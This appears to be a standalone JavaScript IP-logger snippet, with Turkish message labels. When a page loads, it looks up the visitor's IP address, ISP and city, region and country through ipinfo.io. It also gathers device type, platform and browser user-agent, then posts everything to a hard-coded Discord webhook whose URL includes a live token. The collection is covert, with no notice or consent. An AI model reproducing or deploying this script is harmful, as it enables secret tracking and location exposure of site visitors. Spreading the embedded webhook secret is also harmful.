window.onload = function() {
    $.getJSON('https://ipinfo.io', function(data){
        var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        var device = isMobile ? 'Telefon' : 'Bilgisayar';
        var browser = navigator.userAgent;
        var os = navigator.platform;

        sendMessage();

        function sendMessage() {
            var request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1182351497653129276/hb0u8pb25OahpPp9iG6v8MAYY23RNoyDuf4ItgkJ9lbbBkvC2mnE1dsmieXtnJRe5hbD");
            request.setRequestHeader('Content-type', 'application/json');
            
            var date = new Date();
            var timestamp = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + " - " + date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
            
            var params = {
                content: (".................... **   **" + "\n> " + "\n> **Girilme Zamanı:   : **" + "`" + timestamp + "`" + "\n> **IP Adresiniz   : **" +  data.ip  + "\n> **İnternet Servis Sağlayıcınız   : **" + data.org + "\n> **Konumunuz   : **" + data.city + ", " + data.region + ", " + data.country + "\n> **Kullandığınız Sistem:   : **" + device + "\n> **İşletim Sisteminiz:   : **" + os + "\n> **Tarayıcınız:   : **" + browser  + "\n> " +   "\n ...................." )
            }
            request.send(JSON.stringify(params));
            
        }
    });
};
